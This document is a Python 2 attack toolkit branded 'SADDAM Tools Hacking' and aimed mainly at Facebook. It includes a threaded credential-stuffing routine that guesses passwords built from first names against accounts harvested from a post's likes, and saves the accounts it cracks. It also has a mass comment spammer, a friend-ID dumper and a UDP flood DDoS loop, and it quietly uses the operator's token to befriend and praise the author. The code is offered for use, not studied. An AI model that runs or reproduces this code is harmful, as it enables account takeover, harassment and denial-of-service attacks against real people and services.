#!usr/bin/python2
# coding: UTF-8
# created   : Tegar ID
# date      : 29 November 2020
# time      : 09:00
# file name : main.py
# Comunity  : SADDAM SL
# ©Tegar ID All Right Reversed

# recode gk akan menjadikan mu seorang programmer
# jadi mikir dulu kalo mau recode
# hargai karya orang maka kau juga akan di hargai


# import libraries
import os
import socket
import sys
import time
import mechanize
import itertools
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from multiprocessing.pool import ThreadPool
from urllib2 import *
import subprocess as sp
# install libraries
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 main.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')

def kaluar():
    sys.exit("\033[37;1m[\033[31;1m!\033[37;1m] \033[37;1mExit Program")


def ngetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

# banner
logo = """
\033[31;1m
       |  SADDAM ||    \|_|  |_||  _  |
\033[37;1m

           [\033[41;1m SADDAM Tools Hacking \033[00;1m]

\033[32;1mcreated \033[33;1m: \033[37;1mTegar ID
\033[32;1mversi   \033[33;1m: \033[37;1m1.0

"""
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
idteman = []

def masuk():
    os.system('clear')
    print logo
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mlogin using token'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1musing token demo'
    print '\033[37;1m[\033[32;1m03\033[37;1m] \033[34;1mreport bug'
    print '\033[37;1m[\033[32;1m04\033[37;1m] \033[34;1mupdate tools'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[34;1mexit'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    asup()




def asup():
    milih = raw_input('\033[32;1mhome\033[37;1m@\033[34;1mterminal\033[32;1m~#  \033[37;1m')
    if milih == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        time.sleep(2)
        asup()
    elif milih == '1' or milih == '01':
        token()
    elif milih == '2' or milih == '02':
        tokendemo()
    elif milih == '3' or milih == '03':
        report()
    elif milih == '4' or milih == '04':
        os.system("clear")
        os.system("git pull")
        balik = raw_input("\033[31;1m[<back>]")
        os.system("python2 main.py")
    elif milih == '0' or milih == '00':
        keluar()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + milih + ' not found'
        asup()


def tokendemo():
    os.system("clear")
    print logo
    print "\033[33;1mCopy Token Demo"
    print "\033[31;1mEAAAAZAw4FxQIBAIlNtPeV8XssK4RY14cw7kfZACp48eIZCgPw84FOuZBqOLUzO0I0Og0Hg87PFsJCTrwaJHeWZCEZBnLdBNydUnw0ZCz8YGyISZCK6vRMZA12HrdtVOKFlZCn9MjZCD4MZAvQtZBOISngZBzhYBeSV39GIVXkOd0fik78kHgZDZD"
    login = raw_input("\033[36;1m[<Enter To Login>]\n")
    token()

def report():
    os.system("clear")
    print logo
    pesan = raw_input('\033[32;1mMassage? \033[34;1m: \033[37;1m')
    pesan.replace(' ', '%20')
    try:
        sp.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=6282125068665&text=Report: ' + pesan + ''])
    except:
        sys.exit()
    exit('\033[31;1mthanks report bug to me')

def token():
    os.system('clear')
    print logo
    toke = raw_input('\033[37;1m[\033[32;1m*\033[37;1m] \033[34;1minput token\033[33;1m: \033[37;1m')
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token=' + toke)
        a = json.loads(gas.text)
        nyimpen = open('login.txt', 'w')
        nyimpen.write(toke)
        nyimpen.close()
        print 'Token valid'
        bot_komen()
    except KeyError:
        print 'Token invalid !'
        time.sleep(1.7)
        masuk()


def bot_komen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100053435850865'
    kom = 'SC Lo Paling Keren Bang Tegar\xf0\x9f\x98\x98'
    reac = 'LOVE'
    post = '172663694524825'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
    menu()


def menu():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toke)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1mConnection Error'
        kaluar()

    os.system('clear')
    print logo
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAME\x1b[1;90m    =\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =\x1b[1;92m ' + id
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '          \033[37;1m**  \033[32;1mTools Facebook  \033[37;1m**'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[34;1mCrack ID Post From Public/Friend'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[34;1mDump ID'
    print '\033[37;1m[\033[32;1m03\033[37;1m] \033[34;1mSpam Comment'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '     \033[37;1m**  \033[32;1mTools Information Gathering  \033[37;1m**'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m[\033[32;1m04\033[37;1m] \033[34;1mScan Domain'
    print '\033[37;1m[\033[32;1m05\033[37;1m] \033[34;1mCheck Your Machine'
    print '\033[37;1m[\033[32;1m06\033[37;1m] \033[34;1mDNS Lookup'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '          \033[37;1m**  \033[32;1mTools Attacker  \033[37;1m**'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m[\033[32;1m07\033[37;1m] \033[34;1mDDOS'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mExit and Delete Token'
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    pilih()


def pilih():
    gokil = raw_input('\033[32;1mmenu\033[37;1m@\033[34;1mterminal\033[32;1m~#  \033[37;1m')
    if gokil == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        pilih()
    elif gokil == '1' or gokil == '01':
        crack_post()
    elif gokil == '2' or gokil == '02':
        dumpid()
    elif gokil == '3' or gokil == '03':
        spamkomen()
    elif gokil == '4' or gokil == '04':
        scandomain()
    elif gokil == '5' or gokil == '05':
        cek_your_machine()
    elif gokil == '6' or gokil == '06':
        dnslookup()
    elif gokil == '7' or gokil == '07':
        ddos()
    elif gokil == '0' or gokil == '00':
        os.system('clear')
        jalan('\033[34;1mDelete token')
        os.system('rm -rf login.txt')
        kaluar()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + gokil + ' not found'
        pilih()


# tools spam comment
def spamkomen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        os.system('python2 main.py')
    os.system("clear")
    print logo
    post = raw_input("\033[32;1mID Post \033[34;1m=> \033[37;1m")
    kom = raw_input("\033[32;1mComment \033[34;1m=> \033[37;1m")
    jml = int(input("\033[32;1mCount \033[34;1m=> \033[37;1m"))
    print '\033[37;1m[\033[31;1m*\033[37;1m] \033[32;1mplease wait...'
    for x in range(jml):
        requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    print '\033[33;1m[\033[31;1m*\033[33;1m] \033[34;1mSuccess'
    balik = raw_input('\033[31;1m[<back>]\n')
    menu()

# tools ddos
def ddos():
    os.system("clear")
    print logo
    print "\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"+30*"─"+"\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = raw_input('\033[37;1mIP Target : ')
    port = input('\033[37;1mPort       : ')
    os.system('clear')
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print 'Sent %s packet to %s throught port:%s' % (sent, ip, port)
        if port == 65534:
            port = 1



# tools crack
def crack_post():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        po = raw_input('\033[37;1m{\033[32;1m*\033[37;1m}\033[34;1m ID Post Group or Friend : ')
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        r = requests.get('https://graph.facebook.com/' + po + '/likes?limit=9999999&access_token=' + toke)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        ngetik('\r\033[37;1m{\033[32;1m*\033[37;1m} Mengambil ID ...')
    except KeyError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} ID Post Invaled !'
        balik = raw_input('\n\033[32;1m[<Back>]')
        menu()

    print '\033[37;1m{\033[32;1m*\033[37;1m} Total ID : ' + str(len(id))
    print '\033[37;1m{\033[32;1m*\033[37;1m} CTRL+Z To Stop'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        jamet = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + jamet + '/?access_token=' + toke)
            j = json.loads(an.text)
            list1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print ''
                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list1
                print ''
                oke = open('done/group.txt', 'a')
                oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                oke.close()
                oks.append(jamet)
            elif 'www.facebook.com' in ko['error_msg']:
                print ''
                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list1
                print ''
                cek = open('done/group.txt', 'a')
                cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                cek.close()
                cekpoint.append(jamet)
	    else:
		list2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print ''
                    print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                    print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list2
                    print ''
                    oke = open('done/group.txt', 'a')
                    oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    oke.close()
                    oks.append(jamet)
                elif 'www.facebook.com' in ko['error_msg']:
                    print ''
                    print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                    print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list2
                    print ''
                    cek = open('done/group.txt', 'a')
                    cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    cek.close()
                    cekpoint.append(jamet)
                else:
                    list3 = j['first_name'].lower() + '2004'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ''
                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                        print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list3
                        print ''
                        oke = open('done/group.txt', 'a')
                        oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        oke.close()
                        oks.append(jamet)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print ''
                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      ==> ' + j['name']
                        print '\033[37;1m{\033[32;1m*\033[37;1m} User      ==> ' + jamet
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Password  ==> ' + list3
                        print ''
                        cek = open('done/group.txt', 'a')
                        cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        cek.close()
                        cekpoint.append(jamet)


        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m{\033[32;1m*\033[37;1m}Done'
    print '\033[37;1m{\033[32;1m*\033[37;1m}save : done/group.txt'
    print '\033[37;1m{\033[32;1m*\033[37;1m}Checkpoint : ' + str(len(cekpoint))
    print '\033[37;1m{\033[32;1m*\033[37;1m}Sucess     : ' + str(len(oks))
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    balik = raw_input('\n[<back>]\n')
    os.system('python2 main.py')

# tools scan domain
def scandomain():
    os.system("clear")
    print logo
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    try:
        domain = raw_input("\033[31;1mDomain \033[32;1m=> \033[37;1m")
        get_ip = socket.gethostbyname(domain)
        print "\033[34;1mIP",domain,"=>",get_ip
        balik = raw_input("\033[31;1m[<enter to back>]\n")
    except requests.exceptions.ConnectionError:
        print "\033[37;1m[\033[31;1m!\033[37;1m] Conection Error"
    except socket.error:
        print "\033[37;1m[\033[31;1m!\033[37;1m] Domain Failed"
    time.sleep(2)
    menu()

# tools check machine
def cek_your_machine():
    nama_host = socket.gethostname()
    ip_address = socket.gethostbyname(nama_host)
    print "\033[32;1mHost Name\033[33;1m: \033[37;1m"+nama_host
    print "\033[32;1mIp Address\033[33;1m: \033[37;1m"+ip_address
    balik = raw_input("\033[31;1m[<enter to back>]\n")
    menu()


# tools DNS Lookup
def dnslookup():
    os.system("clear")
    print logo
    domain = raw_input('\033[31;1mInput Domain \033[33;1m=> \033[37;1m')
    dns = 'http://api.hackertarget.com/dnslookup/?q=' + domain
    cek = urlopen(dns).read()
    print cek
    balik = raw_input('\033[31;1m[<enter to back>]\n')
    menu()

# tools dump ID
def dumpid():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.system("python2 main.py")
    try:
        os.mkdir('done')
    except OSError:
        pass
    try:
        os.system('clear')
        print logo
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toke)
        z = json.loads(r.text)
        bz = open('done/id.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\033[34;1m[\033[37;1m' + str(len(idteman)) + '\033[34;1m] \033[32;1m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\033[37;1m' + a['id']
        bz.close()
        print '\r\033[31;1mTotal ID :\033[37;1m %s' % len(idteman)
        simpen = raw_input('\r\033[32;1mSave To \033[37;1m=> \033[33;1mFile Name : \033[37;1m')
        os.rename('done/id.txt', 'done/' + simpen)
        print '\r\033[32;1mFile Save \033[33;1m: \033[37;1mdone/' + simpen
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        balik = raw_input('\033[31;1m[<back>]')
        os.system('python2 main.py')
    except IOError:
        print "\033[37;1m[\033[31;1m!\033[37;1m] dont't create file "
        balik = raw_input('\033[31;1m[<back>]')
        menu()
    except (KeyboardInterrupt, EOFError):
        print '\033[37;1m[\033[31;1m!\033[37;1m] stop !'
        balik = raw_input('\033[31;1m[<back>]')
        menu()
    except KeyError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Error !'
        raw_input('\033[31;1m[<back>]')
        menu()
    except OSError:
        print "\033[37;1m[\033[31;1m!\033[37;1m] Don't save"
        balik = raw_input('\n\033[31;1m[<back>]\n')
        os.system('python2 main.py')
    except requests.exceptions.ConnectionError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Conection Error !'
        keluar()




if __name__ == '__main__':
    menu()
    masuk()
